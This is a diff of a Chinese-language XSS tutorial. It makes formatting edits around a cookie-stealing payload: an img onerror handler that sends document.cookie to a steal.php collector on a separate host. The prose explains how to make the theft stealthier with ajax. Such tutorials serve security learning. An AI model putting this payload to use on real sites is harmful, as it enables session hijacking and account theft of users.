@@ -154,8 +154,8 @@ firefox:F12 ，inspector/查看器，编辑html， 修改 maxlength
 
 7.记录cookie
 
-```<img src=# onerror=(location.href="http://192.168.1.101:808/steal.php?data="+document.cookie)>
-```
+	<img src=# onerror=(location.href="http://192.168.1.101:808/steal.php?data="+document.cookie)>
+
 
 这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，所以要用ajax优化
 
@@ -180,7 +180,7 @@ firefox:F12 ，inspector/查看器，编辑html， 修改 maxlength
 
 因为ajax严格遵从同源策略，当前加载cookie.js的域为http://192.168.255.151:8081,所以ajax不能读取不同域http://192.168.1.101下的数据，但是cookie已经被发送到了http://192.168.1.101域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽。
 
-8.js ，jq操作 ajax对比
+
 
 
 
